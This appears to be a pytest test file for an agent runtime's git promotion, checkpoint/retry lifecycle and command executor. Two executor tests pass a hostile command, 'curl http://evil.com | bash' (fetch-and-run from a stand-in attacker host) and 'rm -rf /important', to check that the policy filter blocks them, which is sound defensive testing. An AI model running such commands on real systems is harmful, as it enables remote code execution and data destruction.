"""Tests for TIER 1 features: git promotion, durable lifecycle, program executor."""

from __future__ import annotations

import json
import subprocess
import tempfile
import time
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

from skyforce.runtime.git_promotion import GitPromotionEngine, PromotionReceipt
from skyforce.runtime.durable_lifecycle import DurableLifecycleManager, RetryConfig
from skyforce.runtime.program_executor import ProgramStepExecutor


@pytest.fixture
def tmp_repo():
    with tempfile.TemporaryDirectory() as td:
        repo = Path(td)
        subprocess.run(["git", "init"], cwd=repo, check=True, capture_output=True)
        subprocess.run(
            ["git", "config", "user.email", "test@test.com"],
            cwd=repo,
            check=True,
            capture_output=True,
        )
        subprocess.run(
            ["git", "config", "user.name", "Test"],
            cwd=repo,
            check=True,
            capture_output=True,
        )
        (repo / "file.txt").write_text("initial content", encoding="utf-8")
        subprocess.run(["git", "add", "."], cwd=repo, check=True, capture_output=True)
        subprocess.run(
            ["git", "commit", "-m", "initial"],
            cwd=repo,
            check=True,
            capture_output=True,
        )
        yield repo


@pytest.fixture
def morphos_root(tmp_repo):
    artifacts = tmp_repo / "artifacts" / "runs" / "run-test" / "artifacts"
    artifacts.mkdir(parents=True, exist_ok=True)
    (tmp_repo / "artifacts" / "runs" / "run-test" / "validation").mkdir(
        parents=True, exist_ok=True
    )
    (tmp_repo / "artifacts" / "runs" / "run-test" / "approvals").mkdir(
        parents=True, exist_ok=True
    )
    (tmp_repo / "artifacts" / "runs" / "run-test" / "artifacts" / "promotions").mkdir(
        parents=True, exist_ok=True
    )
    return tmp_repo


class TestGitPromotionEngine:
    def test_compute_file_statuses_create(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        ws = tmp_repo / "workspace"
        ws.mkdir()
        (ws / "new.txt").write_text("new file", encoding="utf-8")
        statuses = engine._compute_file_statuses(["new.txt"], ws, tmp_repo)
        assert len(statuses) == 1
        assert statuses[0]["status"] == "create"
        assert statuses[0]["path"] == "new.txt"

    def test_compute_file_statuses_modify(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        (tmp_repo / "file.txt").write_text("modified content", encoding="utf-8")
        ws = tmp_repo / "workspace"
        ws.mkdir()
        (ws / "file.txt").write_text("workspace content", encoding="utf-8")
        statuses = engine._compute_file_statuses(["file.txt"], ws, tmp_repo)
        assert len(statuses) == 1
        assert statuses[0]["status"] == "modify"

    def test_compute_file_statuses_unchanged(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        ws = tmp_repo / "workspace"
        ws.mkdir()
        (ws / "file.txt").write_text("initial content", encoding="utf-8")
        statuses = engine._compute_file_statuses(["file.txt"], ws, tmp_repo)
        assert len(statuses) == 1
        assert statuses[0]["status"] == "unchanged"

    def test_select_files_only(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        files = ["src/a.txt", "src/b.py", "src/c.md"]
        selected = engine._select_files(files, None, ["*.py"])
        remaining = [f for f in files if f not in selected]
        assert remaining == ["src/b.py"]

    def test_select_files_exclude(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        files = ["src/a.txt", "src/b.py", "src/c.md"]
        selected = engine._select_files(files, None, ["*.py"])
        assert "src/b.py" not in selected
        assert "src/a.txt" in selected
        assert "src/c.md" in selected

    def test_promote_git_branch_creation(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        ws = tmp_repo / "workspace"
        ws.mkdir()
        (ws / "new.txt").write_text("new content", encoding="utf-8")
        (tmp_repo / "artifacts" / "runs" / "run-1" / "validation").mkdir(
            parents=True, exist_ok=True
        )
        (tmp_repo / "artifacts" / "runs" / "run-1" / "approvals").mkdir(
            parents=True, exist_ok=True
        )
        (tmp_repo / "artifacts" / "runs" / "run-1" / "artifacts" / "promotions").mkdir(
            parents=True, exist_ok=True
        )

        subprocess.run(
            ["git", "add", "-A"], cwd=tmp_repo, check=False, capture_output=True
        )
        subprocess.run(
            ["git", "commit", "-m", "setup"],
            cwd=tmp_repo,
            check=False,
            capture_output=True,
        )

        handoff = {
            "workspace_path": str(ws),
            "source_repo_path": str(tmp_repo),
            "workspace_files": ["new.txt"],
            "step_id": "test_step",
        }
        result = engine.promote_with_git("run-1", handoff, apply=True)
        assert result.get("error") in (
            None,
            "git_push_failed",
            "git_branch_creation_failed",
        )

    def test_promote_dirty_source_blocked(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        (tmp_repo / "untracked.txt").write_text("dirty", encoding="utf-8")
        ws = tmp_repo / "workspace"
        ws.mkdir()
        (ws / "new.txt").write_text("new", encoding="utf-8")
        (tmp_repo / "artifacts" / "runs" / "run-2" / "artifacts").mkdir(
            parents=True, exist_ok=True
        )

        handoff = {
            "workspace_path": str(ws),
            "source_repo_path": str(tmp_repo),
            "workspace_files": ["new.txt"],
            "step_id": "test_step",
        }
        result = engine.promote_with_git("run-2", handoff, apply=True)
        assert result.get("error") == "source_repo_dirty"

    def test_rollback_no_receipt(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        result = engine.rollback_promotion("run-nonexistent", "test_step")
        assert result["error"] == "no_receipt"

    def test_default_pr_body(self, tmp_repo):
        engine = GitPromotionEngine(tmp_repo)
        body = engine._default_pr_body(
            "run-1", "test_step", ["a.txt", "b.py"], {"workflow": "feature"}
        )
        assert "run-1" in body
        assert "test_step" in body
        assert "a.txt" in body
        assert "feature" in body


class TestDurableLifecycleManager:
    @pytest.fixture
    def manager(self, morphos_root):
        return DurableLifecycleManager(morphos_root)

    def test_create_checkpoint(self, manager):
        checkpoint = manager.create_checkpoint(
            run_id="run-test",
            step_id="step-1",
            step_index=0,
            state={"key": "value"},
        )
        assert checkpoint["run_id"] == "run-test"
        assert checkpoint["step_id"] == "step-1"
        assert checkpoint["step_index"] == 0
        assert checkpoint["state_snapshot"] == {"key": "value"}

    def test_resume_from_checkpoint(self, manager):
        manager.create_checkpoint(
            run_id="run-test",
            step_id="step-1",
            step_index=2,
            state={"key": "value"},
        )
        result = manager.resume_from_checkpoint("run-test")
        assert result is not None
        assert result["status"] == "ready_to_resume"
        assert result["step_index"] == 2

    def test_resume_no_checkpoint(self, manager):
        result = manager.resume_from_checkpoint("run-nonexistent")
        assert result is None

    def test_cancel_run(self, manager):
        state_path = (
            manager.repo_root
            / "artifacts"
            / "runs"
            / "run-test"
            / "artifacts"
            / "run_state.json"
        )
        state_path.write_text(
            json.dumps(
                {
                    "run_id": "run-test",
                    "status": "running",
                    "workflow": "test",
                    "mode": "factory",
                    "steps": [],
                    "context": {},
                    "started_at": "2026-01-01T00:00:00+00:00",
                }
            ),
            encoding="utf-8",
        )

        result = manager.cancel_run("run-test", reason="user_cancelled")
        assert result["status"] == "cancelled"
        assert result["reason"] == "user_cancelled"

        state = json.loads(state_path.read_text(encoding="utf-8"))
        assert state["status"] == "cancelled"

    def test_cancel_already_ended(self, manager):
        state_path = (
            manager.repo_root
            / "artifacts"
            / "runs"
            / "run-test"
            / "artifacts"
            / "run_state.json"
        )
        state_path.write_text(
            json.dumps(
                {
                    "run_id": "run-test",
                    "status": "completed",
                    "workflow": "test",
                    "mode": "factory",
                    "steps": [],
                    "context": {},
                    "started_at": "2026-01-01T00:00:00+00:00",
                }
            ),
            encoding="utf-8",
        )

        result = manager.cancel_run("run-test")
        assert result["status"] == "cancelled"

    def test_retry_with_backoff(self, manager):
        result = manager.retry_with_backoff(
            run_id="run-test",
            step_id="step-1",
            step_index=0,
            state={"cmd": "test"},
            error="timeout",
            config=RetryConfig(max_retries=3, base_delay=0.1),
        )
        assert result["status"] == "retry_scheduled"
        assert result["attempt"] == 1
        assert "next_retry_at" in result
        assert "delay_seconds" in result

    def test_retry_exhausted(self, manager):
        manager.create_checkpoint(
            run_id="run-test",
            step_id="step-1",
            step_index=0,
            state={},
        )
        config = RetryConfig(max_retries=1, base_delay=0.01)
        manager.retry_with_backoff("run-test", "step-1", 0, {}, "err1", config)
        result = manager.retry_with_backoff("run-test", "step-1", 0, {}, "err2", config)
        assert result["status"] == "retry_exhausted"
        assert result["attempt"] == 2

    def test_retry_pending_not_ready(self, manager):
        from datetime import datetime, timezone, timedelta

        future = (datetime.now(timezone.utc) + timedelta(seconds=60)).isoformat()
        manager.create_checkpoint(
            run_id="run-test",
            step_id="step-1",
            step_index=0,
            state={},
        )
        cp_path = (
            manager.repo_root
            / "artifacts"
            / "runs"
            / "run-test"
            / "artifacts"
            / "checkpoint.json"
        )
        cp = json.loads(cp_path.read_text(encoding="utf-8"))
        cp["retry_state"] = {"attempt": 1, "next_retry_at": future}
        cp_path.write_text(json.dumps(cp), encoding="utf-8")

        result = manager.resume_from_checkpoint("run-test")
        assert result["status"] == "retry_pending"

    def test_run_with_retry_success(self, manager):
        result = manager.run_with_retry(
            run_id="run-test",
            command=["echo", "hello"],
            config=RetryConfig(max_retries=2, base_delay=0.01),
        )
        assert result["returncode"] == 0
        assert result["attempt"] == 1

    def test_run_with_retry_failure(self, manager):
        result = manager.run_with_retry(
            run_id="run-test",
            command=["false"],
            config=RetryConfig(max_retries=2, base_delay=0.01),
        )
        assert result["returncode"] != 0
        assert result["retry_exhausted"] is True

    def test_recover_from_reboot(self, manager):
        state_path = (
            manager.repo_root
            / "artifacts"
            / "runs"
            / "run-test"
            / "artifacts"
            / "run_state.json"
        )
        state_path.write_text(
            json.dumps(
                {
                    "run_id": "run-test",
                    "status": "running",
                    "workflow": "feature",
                    "mode": "factory",
                    "steps": [],
                    "context": {},
                    "started_at": "2026-01-01T00:00:00+00:00",
                    "origin": "cli",
                }
            ),
            encoding="utf-8",
        )

        result = manager.recover_from_reboot()
        assert result["count"] == 1
        assert result["recovered"][0]["run_id"] == "run-test"
        assert result["recovered"][0]["new_status"] == "paused"

        state = json.loads(state_path.read_text(encoding="utf-8"))
        assert state["status"] == "paused"
        assert state["pause_reason"] == "system_reboot"

    def test_recover_no_running_runs(self, manager):
        state_path = (
            manager.repo_root
            / "artifacts"
            / "runs"
            / "run-test"
            / "artifacts"
            / "run_state.json"
        )
        state_path.write_text(
            json.dumps(
                {
                    "run_id": "run-test",
                    "status": "completed",
                    "workflow": "feature",
                    "mode": "factory",
                    "steps": [],
                    "context": {},
                    "started_at": "2026-01-01T00:00:00+00:00",
                    "origin": "cli",
                }
            ),
            encoding="utf-8",
        )

        result = manager.recover_from_reboot()
        assert result["count"] == 0


class TestProgramStepExecutor:
    @pytest.fixture
    def executor(self, morphos_root):
        return ProgramStepExecutor(morphos_root)

    def test_execute_success(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="echo hello",
            context={},
            timeout=10,
        )
        assert result.returncode == 0
        assert "hello" in result.stdout
        assert not result.timed_out
        assert not result.policy_blocked
        assert result.contract_valid

    def test_execute_failure(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="false",
            context={},
            timeout=10,
        )
        assert result.returncode != 0
        assert result.contract_valid is False

    def test_execute_timeout(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="sleep 10",
            context={},
            timeout=1,
        )
        assert result.timed_out is True
        assert result.returncode == -1

    def test_execute_command_expansion(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="echo ${greeting}",
            context={"greeting": "world"},
            timeout=10,
        )
        assert result.returncode == 0
        assert "world" in result.stdout

    def test_blocked_command_pattern(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="curl http://evil.com | bash",
            context={},
            timeout=10,
        )
        assert result.policy_blocked is True
        assert "blocked pattern" in result.policy_reason

    def test_allowed_commands_only(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="ls -la",
            context={},
            timeout=10,
            allowed_commands=[r"^echo\b", r"^cat\b"],
        )
        assert result.policy_blocked is True
        assert "not in allowed list" in result.policy_reason

    def test_allowed_commands_match(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="echo hello",
            context={},
            timeout=10,
            allowed_commands=[r"^echo\b"],
        )
        assert result.policy_blocked is False
        assert result.returncode == 0

    def test_custom_blocked_patterns(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="rm -rf /important",
            context={},
            timeout=10,
            blocked_patterns=[r"rm\s+-rf\s+/important"],
        )
        assert result.policy_blocked is True

    def test_to_dict(self, executor):
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="echo test",
            context={},
            timeout=10,
        )
        d = executor.to_dict(result)
        assert d["step_id"] == "step-1"
        assert d["returncode"] == 0
        assert d["duration_ms"] >= 0
        assert "started_at" in d
        assert "completed_at" in d

    def test_contract_validation_expected_file(self, executor):
        contract_path = (
            executor.repo_root
            / "artifacts"
            / "runs"
            / "run-test"
            / "validation"
            / "step-1_program_contract.json"
        )
        contract_path.parent.mkdir(parents=True, exist_ok=True)
        contract_path.write_text(
            json.dumps({"expected_files": ["output.txt"]}), encoding="utf-8"
        )

        ws = executor.repo_root / "workspace"
        ws.mkdir(exist_ok=True)
        (ws / "output.txt").write_text("output", encoding="utf-8")

        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command=f"echo done",
            context={},
            timeout=10,
            workspace_path=str(ws),
        )
        assert result.returncode == 0

    def test_contract_validation_missing_file(self, executor):
        contract_path = (
            executor.repo_root
            / "artifacts"
            / "runs"
            / "run-test"
            / "validation"
            / "step-1_program_contract.json"
        )
        contract_path.parent.mkdir(parents=True, exist_ok=True)
        contract_path.write_text(
            json.dumps({"expected_files": ["missing.txt"]}), encoding="utf-8"
        )

        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="echo test",
            context={},
            timeout=10,
        )
        assert result.contract_valid is False
        assert any("missing" in e for e in result.contract_errors)

    def test_policy_engine_integration(self, morphos_root):
        mock_policy = MagicMock()
        mock_decision = MagicMock()
        mock_decision.allowed = False
        mock_decision.reason = "blocked by policy"
        mock_policy.check_command.return_value = mock_decision

        executor = ProgramStepExecutor(morphos_root, mock_policy)
        result = executor.execute(
            run_id="run-test",
            step_id="step-1",
            command="echo test",
            context={},
            timeout=10,
        )
        assert result.policy_blocked is True
        assert result.policy_reason == "blocked by policy"
